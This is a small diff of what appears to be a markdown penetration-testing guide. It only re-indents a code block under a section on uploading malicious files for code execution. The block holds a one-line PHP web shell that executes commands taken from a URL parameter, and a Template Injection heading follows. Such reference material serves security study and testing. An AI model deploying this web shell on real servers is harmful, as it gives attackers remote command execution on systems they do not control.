@@ -98,8 +98,8 @@ Upload malicious files to achieve code execution:
 
 **PHP Web Shell:**
 
-```php
-<?php system($_GET['cmd']); ?>
+	```php
+	<?php system($_GET['cmd']); ?>
 ```
 
 ### Template Injection
